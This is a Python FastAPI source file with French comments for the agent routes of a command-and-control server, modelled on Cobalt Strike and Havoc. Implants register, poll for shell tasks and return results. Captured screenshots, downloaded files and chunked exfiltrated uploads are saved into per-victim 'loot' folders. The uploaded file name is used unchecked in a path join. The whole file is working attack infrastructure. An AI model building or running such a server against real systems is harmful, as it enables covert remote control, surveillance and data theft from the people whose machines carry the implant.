# ============================================================
#  server/routes/agent.py — Routes pour les agents (implants)
#  Rôle        : Enregistrement, polling, résultats (pas d'auth)
#  Importé par : main.py (inclusion FastAPI)
#  Dépend de   : models.py, storage.py, database.py
#
#  CORRECTION : toutes les routes sont async def
#               tous les appels DB ont await
# ============================================================

import uuid
import time
import os
import base64
from datetime import datetime
from fastapi import APIRouter, HTTPException

from models import AgentRegister, CommandResult, TaskResponse, FileChunk
import storage
import database as db

router = APIRouter(prefix="/agent", tags=["Agent"])


# ── POST /agent/register ──────────────────────────────────────

@router.post("/register")
async def register_agent(agent_info: AgentRegister):
    """
    Enregistre un agent ou réidentifie une machine déjà connue.

    Résolution en 3 niveaux (inspiré du beacon Cobalt Strike) :
      1. L'agent envoie son agent_id sauvegardé → vérification directe en DB.
         Si trouvé : mise à jour last_seen + status, même ID renvoyé.
      2. Sinon : recherche par empreinte machine (hostname + username + os).
         Si trouvé : même ID réutilisé, aucun doublon créé.
      3. Sinon : nouvelle machine → génération d'un nouvel agent_id.

    Ce mécanisme garantit qu'un agent qui redémarre ne crée pas de doublon
    dans la table agents et reste visible sous le même ID dans l'opérateur CLI.
    """
    now = time.time()
    is_reconnect = False

    # ── Niveau 1 : agent_id fourni par l'agent (fichier .agent_id) ──────────
    if agent_info.agent_id:
        existing = await db.get_agent_by_id(agent_info.agent_id)
        if existing:
            agent_id     = existing["id"]
            is_reconnect = True
            await db.update_agent_reconnect(agent_id)
            print(f"\n[↩] Reconnexion agent (ID connu): {agent_id} - {agent_info.hostname}")

    # ── Niveau 2 : recherche par empreinte machine ───────────────────────────
    if not is_reconnect:
        existing = await db.get_agent_by_fingerprint(
            agent_info.hostname, agent_info.username, agent_info.os
        )
        if existing:
            agent_id     = existing["id"]
            is_reconnect = True
            await db.update_agent_reconnect(agent_id)
            print(f"\n[↩] Reconnexion agent (empreinte): {agent_id} - {agent_info.hostname}")

    # ── Niveau 3 : vraiment nouvel agent ────────────────────────────────────
    if not is_reconnect:
        agent_id = uuid.uuid4().hex[:8]
        await db.save_agent(agent_id, agent_info.hostname, agent_info.username, agent_info.os)
        await db.log_message("INFO", "agent", f"Nouvel agent enregistré: {agent_id}")
        print(f"\n[+] Nouvel agent: {agent_id} - {agent_info.hostname} ({agent_info.os})")

    # ── Mise à jour du cache mémoire ─────────────────────────────────────────
    agent_data = {
        "id":            agent_id,
        "hostname":      agent_info.hostname,
        "username":      agent_info.username,
        "os":            agent_info.os,
        "registered_at": now,
        "last_seen":     now,
        "status":        "online"
    }
    storage.register_agent_memory(agent_id, agent_data)

    # ── Log événement ────────────────────────────────────────────────────────
    event_type = "reconnect" if is_reconnect else "register"
    await db.log_agent_event(agent_id, event_type, f"{agent_info.hostname}\\{agent_info.username}")

    return {
        "agent_id": agent_id,
        "message":  "Reconnexion" if is_reconnect else "Enregistrement réussi"
    }


# ── GET /agent/{agent_id}/poll ────────────────────────────────

@router.get("/{agent_id}/poll")
async def poll_command(agent_id: str):
    """
    Polling du serveur par l'agent + heartbeat.
    async → toutes les lectures/écritures DB sont non bloquantes.
    Critique : avec N agents qui pollent simultanément, async évite la file d'attente.
    """
    # Vérifie que l'agent existe en mémoire
    if agent_id not in storage.agents:
        db_agent = await db.get_agent_by_id(agent_id)
        if db_agent:
            await storage.sync_agent_from_db(agent_id)
        else:
            raise HTTPException(status_code=404, detail="Agent inconnu")

    # Met à jour heartbeat en mémoire + DB
    await storage.update_agent_last_seen(agent_id)       # await ← storage est async

    # Cherche une tâche pending en DB
    pending_task = await db.get_pending_tasks_for_agent(agent_id)   # await ← async

    if pending_task:
        task_id   = pending_task["task_id"]
        command   = pending_task["command"]
        module    = pending_task.get("module",    "shell")
        file_data = pending_task.get("file_data", "")
        filename  = pending_task.get("filename",  "")
        technique = pending_task.get("technique", "")

        # Marque comme délivrée en DB
        await db.mark_task_delivered(task_id)            # await ← async

        # Nettoie la tâche de la mémoire cache (pending count)
        if agent_id in storage.tasks:
            storage.tasks[agent_id] = [
                t for t in storage.tasks[agent_id]
                if t["task_id"] != task_id
            ]

        # Log l'événement
        await db.log_agent_event(agent_id, "delivered", f"task:{task_id}")   # await

        print(f"\n[→] Task {task_id} délivrée à {agent_id}: {command[:50]}...")

        return TaskResponse(
            has_task=True,
            task_id=task_id,
            command=command,
            module=module,
            file_data=file_data,
            filename=filename,
            technique=technique,
        )

    # Pas de tâche disponible
    return TaskResponse(has_task=False, task_id=None, command=None)


# ── POST /agent/result ────────────────────────────────────────

@router.post("/result")
async def submit_result(result: CommandResult):
    """
    L'agent envoie le résultat d'une commande exécutée.
    async → save_result(), mark_task_done(), log_agent_event() non bloquants.
    """
    # Vérifie l'agent en mémoire
    if result.agent_id not in storage.agents:
        raise HTTPException(status_code=404, detail="Agent inconnu")

    # Vérifie que la tâche existe en DB
    task = await db.get_task_by_id(result.task_id)       # await ← async
    if not task:
        raise HTTPException(status_code=404, detail="Task ID inconnu")

    # ── Screenshot : BMP_B64:<WxH>:<base64> → fichier .bmp ──────
    if result.output.startswith("BMP_B64:") and result.status == "success":
        try:
            # Format: BMP_B64:<width>x<height>:<base64data>\n[OK]...
            header_end = result.output.index(":", 8)          # 2nd colon
            b64_start  = header_end + 1
            b64_end    = result.output.find("\n", b64_start)
            b64_data   = result.output[b64_start:b64_end] if b64_end != -1 else result.output[b64_start:]

            bmp_bytes  = base64.b64decode(b64_data)
            ts         = datetime.now().strftime("%Y%m%d_%H%M%S")
            loot_dir   = os.path.join("server", "loot", result.agent_id, "screenshots")
            os.makedirs(loot_dir, exist_ok=True)
            save_path  = os.path.join(loot_dir, f"screenshot_{ts}.bmp")

            with open(save_path, "wb") as f:
                f.write(bmp_bytes)

            size_kb = len(bmp_bytes) // 1024
            await db.save_loot(result.task_id, result.agent_id,
                               f"screenshot_{ts}.bmp", save_path, len(bmp_bytes))

            result.output = f"[SCREENSHOT] Sauvegardé → loot/{result.agent_id}/screenshots/screenshot_{ts}.bmp ({size_kb} KB)"
            print(f"\n[📷] Screenshot reçu → {save_path} ({size_kb} KB)")

        except Exception as e:
            print(f"\n[✗] Erreur sauvegarde screenshot: {e}")
            result.output = f"[SCREENSHOT] Reçu mais erreur sauvegarde: {e}"

    # Handle download result (base64 encoded file bytes)
    if task.get("module") == "download" and result.status == "success":
        try:
            # Decode base64 (strip whitespace in case of chunked output)
            file_bytes = base64.b64decode(result.output.strip())

            # Parse command to extract file path: "download C:\path"
            command_parts = task["command"].split(None, 1)
            file_path  = command_parts[1] if len(command_parts) >= 2 else task["command"]
            filename   = os.path.basename(file_path.replace("\\", "/"))

            # Save to loot directory
            loot_dir  = os.path.join("server", "loot", result.agent_id)
            os.makedirs(loot_dir, exist_ok=True)
            save_path = os.path.join(loot_dir, filename)

            with open(save_path, "wb") as f:
                f.write(file_bytes)

            file_size = len(file_bytes)
            await db.save_loot(result.task_id, result.agent_id,
                               filename, save_path, file_size)

            result.output = (f"[FILE] Sauvegardé → loot/{result.agent_id}/{filename} "
                             f"({file_size} bytes)")
            print(f"\n[↓] Fichier reçu: {filename} ({file_size} bytes) → {save_path}")

        except Exception as e:
            print(f"\n[✗] Erreur sauvegarde fichier téléchargé: {e}")
            result.output = f"[ERREUR] Sauvegarde échouée: {e}"
    
    # Sauvegarde le résultat en DB
    await db.save_result(result.task_id, result.agent_id, result.output, result.status)  # await

    # Marque la tâche comme terminée
    status_db = "done" if result.status == "success" else "error"
    await db.mark_task_done(result.task_id, status_db)   # await ← async

    # Stocke en mémoire pour accès rapide (dernier résultat)
    storage.store_result(result.agent_id, {              # sync mémoire — pas de await
        "task_id": result.task_id,
        "output":  result.output,
        "status":  result.status
    })

    # Log l'événement
    await db.log_agent_event(                            # await ← async
        result.agent_id,
        "result",
        f"task:{result.task_id} status:{result.status}"
    )

    preview = result.output[:100] + "..." if len(result.output) > 100 else result.output
    print(f"\n[←] Résultat task {result.task_id} [{result.status}]: {preview}")

    return {"message": "Résultat reçu"}


# ── POST /agent/upload ────────────────────────────────────────

# Buffer de réassemblage en mémoire : { task_id: { chunk_index: bytes } }
_upload_chunks: dict = {}

@router.post("/upload")
async def receive_file_chunk(chunk: FileChunk):
    """
    Reçoit un chunk de fichier depuis l'agent.

    Pattern CobaltStrike / Havoc :
      - L'agent découpe le fichier en blocs de 384 KB (512 KB en base64)
      - Chaque chunk est envoyé indépendamment avec son index et le total
      - Le serveur réassemble dès que tous les chunks sont reçus
      - Sauvegarde dans server/loot/<agent_id>/<filename>

    Ce design bypass complètement la limite MAX_OUTPUT_SIZE (128 KB)
    du buffer de résultat de tâche, quelle que soit la taille du fichier.
    """
    if chunk.agent_id not in storage.agents:
        raise HTTPException(status_code=404, detail="Agent inconnu")

    # Decode le chunk
    try:
        raw = base64.b64decode(chunk.data)
    except Exception:
        raise HTTPException(status_code=400, detail="Base64 invalide")

    # Stocke le chunk en mémoire
    if chunk.task_id not in _upload_chunks:
        _upload_chunks[chunk.task_id] = {}
    _upload_chunks[chunk.task_id][chunk.chunk_index] = raw

    received = len(_upload_chunks[chunk.task_id])

    # Tous les chunks reçus → réassembler et sauvegarder
    if received == chunk.total_chunks:
        chunks_map = _upload_chunks.pop(chunk.task_id)
        file_data  = b"".join(chunks_map[i] for i in range(chunk.total_chunks))

        loot_dir = os.path.join("server", "loot", chunk.agent_id)
        os.makedirs(loot_dir, exist_ok=True)
        save_path = os.path.join(loot_dir, chunk.filename)

        with open(save_path, "wb") as f:
            f.write(file_data)

        file_size = len(file_data)
        await db.save_loot(chunk.task_id, chunk.agent_id,
                           chunk.filename, save_path, file_size)

        size_str = (f"{file_size / (1024*1024):.1f} MB" if file_size >= 1024*1024
                    else f"{file_size / 1024:.1f} KB")
        print(f"\n[↑] Fichier reçu : {chunk.filename} ({size_str}) "
              f"→ loot/{chunk.agent_id}/")
        return {"status": "complete", "saved": save_path}

    return {"status": "partial", "received": received,
            "total": chunk.total_chunks}